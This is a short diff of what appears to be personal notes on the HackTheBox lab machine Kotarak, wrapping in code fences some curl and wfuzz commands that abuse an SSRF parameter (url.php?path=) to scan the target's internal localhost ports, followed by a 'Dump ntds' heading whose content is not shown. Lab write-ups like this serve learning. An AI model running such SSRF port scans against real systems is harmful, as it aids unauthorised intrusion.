@@ -2,6 +2,7 @@ https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html
 https://www.youtube.com/watch?v=38e-sxPWiuY
 
 ### Enum on SSRF
+```
 ❯ curl http://10.129.1.117:60000/url.php?path=http://localhost:22
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
 Protocol mismatch.
@@ -23,6 +24,7 @@ wfuzz -c -z range,1-65535 http://10.129.1.117:60000/url.php?path=http://localhos
 --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
 
 wfuzz -c -z range,1-65535 --hl 2 http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ
+```
 
 ### Dump ntds
 ```
